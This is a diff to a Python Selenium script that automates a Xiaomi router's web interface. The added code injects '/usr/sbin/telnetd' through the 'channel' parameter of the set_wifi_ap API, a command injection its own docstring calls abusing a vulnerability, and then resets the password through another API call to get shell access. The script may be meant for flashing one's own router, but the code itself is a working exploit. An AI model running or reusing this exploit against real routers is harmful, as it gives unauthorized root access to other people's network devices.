@@ -22,6 +22,11 @@ NotFound = selenium.common.exceptions.NoSuchElementException
 RETURN = selenium.webdriver.common.keys.Keys.RETURN
 
 ADDRESS = '192.168.31.1'  # Xiaomi default.
+ABUSE = ("http://{}/cgi-bin/luci/;stok={}/api/xqnetwork/"
+    "set_wifi_ap?ssid=whatever&encryption=NONE&enctype=NONE&"
+    "channel=1%3B%2Fusr%2Fsbin%2Ftelnetd")  # TODO urllib.quote_plus
+PASSWD = ("http://{}/cgi-bin/luci/;stok={}/api/xqsystem/"
+    "set_name_password?oldPwd={}&newPwd={}")
 
 def ping(address):
     return subprocess.call(['/usr/bin/ping', '-c1', address],  # Only 1 ping!
@@ -87,9 +92,22 @@ def login(driver, address, password):
         return False
     return match.group(1)
 
+def setup_telnet(driver, address, token, password, new):
+    """
+    Abuse vulnerability to start telnet server.
+    Change password to enable shell access.
+    """
+    driver.get(ABUSE.format(address, token))
+    while "Probe timeout" not in driver.page_source:
+        time.sleep(5)  # TODO timeout.
+    driver.get(PASSWD.format(address, token, password, new))
+    while '{"code":0}' not in driver.page_source:
+        time.sleep(5)
+
 if __name__ == '__main__':
-    PASSWORD = 'freudich'
+    PASSWORD = 'password'
     driver = selenium.webdriver.Firefox()
     driver.set_window_size(800, 600)
-#    print(initial_setup(driver, ADDRESS, 'freufunk', PASSWORD))
-    print(login(driver, ADDRESS, PASSWORD))
+    print(initial_setup(driver, ADDRESS, 'freufunk', PASSWORD))
+    token = login(driver, ADDRESS, PASSWORD)
+    setup_telnet(driver, ADDRESS, token, PASSWORD, PASSWORD)
